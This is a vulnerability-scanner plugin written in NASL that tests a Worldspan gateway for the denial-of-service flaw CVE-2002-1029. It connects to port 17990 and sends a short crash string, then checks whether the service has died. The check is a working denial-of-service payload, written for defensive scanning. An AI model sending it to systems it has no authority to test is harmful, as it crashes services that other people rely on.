if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11049" );
	script_version( "2019-04-11T14:06:24+0000" );
	script_tag( name: "last_modification", value: "2019-04-11 14:06:24 +0000 (Thu, 11 Apr 2019)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 5169 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_cve_id( "CVE-2002-1029" );
	script_name( "Worldspan gateway DOS" );
	script_category( ACT_DENIAL );
	script_copyright( "This script is Copyright (C) 2002 Michel Arboi" );
	script_family( "Denial of Service" );
	script_dependencies( "find_service.sc" );
	script_require_ports( 17990 );
	script_tag( name: "solution", value: "Upgrade your software." );
	script_tag( name: "summary", value: "It was possible to crash the Worldspan gateway by sending illegal data." );
	script_tag( name: "impact", value: "A cracker may use this attack to make this service
  crash continuously, preventing you from working." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
port = 17990;
if(!get_port_state( port )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
s = NASLString( "worldspanshouldgoboom\\r" );
send( socket: soc, data: s );
close( soc );
sleep( 60 );
soc = open_sock_tcp( port );
if(!soc){
	security_message( port: port );
	exit( 0 );
}
close( soc );
exit( 99 );

